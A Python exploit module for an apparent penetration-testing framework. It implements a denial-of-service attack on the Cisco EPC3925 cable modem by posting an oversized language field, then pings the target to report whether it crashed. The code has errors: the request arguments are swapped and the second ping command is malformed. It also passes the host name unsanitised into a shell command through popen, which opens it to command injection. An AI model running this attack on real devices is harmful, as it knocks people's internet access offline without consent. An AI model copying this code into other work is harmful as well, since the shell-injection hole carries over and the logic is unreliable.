# Cisco EPC3925 - DoS via 'Lang' Cookie
# https://www.exploit-db.com/exploits/40383/

from jframework.modules.model import ModuleSinglePort
from http.client import HTTPConnection
from urllib.parse import urlencode
from os import popen


class Dos_lang_cookie(ModuleSinglePort):

    def run(self):
        headers = {"Host": self.host,
        "User-Agent": "Mozilla/5.0(WindowsNT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0",
        "Accept": "text/html, application/xhtml + xml, application/xml; q = 0.9,*/*; q = 0.8",
        "Accept-Language": "pl, en-US; q = 0.7,en; q = 0.3",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "http: //" + self.host + "/Docsis_system.asp",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": 142}

        parameters = headers2 = urlencode({"username_login": "aaa",
         "password_login": "bbb",
         "LanguageSelect": "enXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
         "Language_Submit": ""})

        try:
            response = popen("ping -c 1 " + self.host)
            if(not "ttl" in response.read().lower()):
                print("Host appears to be unavailable")
                return
            http = HTTPConnection(host=self.host, port=self.single_port, timeout=2)
            http.request("POST", "/goform/Docsis_system", headers, parameters)
            del headers["Content-Type"]
            del headers["Content-Length"]
            http.request("GET", "/Docsis_system.asp", headers)
            response = popen("ping -c " + self.host)
            if("host unreachable" in response.read().lower()):
                print(self.host + " is vulnerable. It's down.")
            else:
                print(self.host + " isn't vulnerable")
        except:
            print("Connection refused")
            return None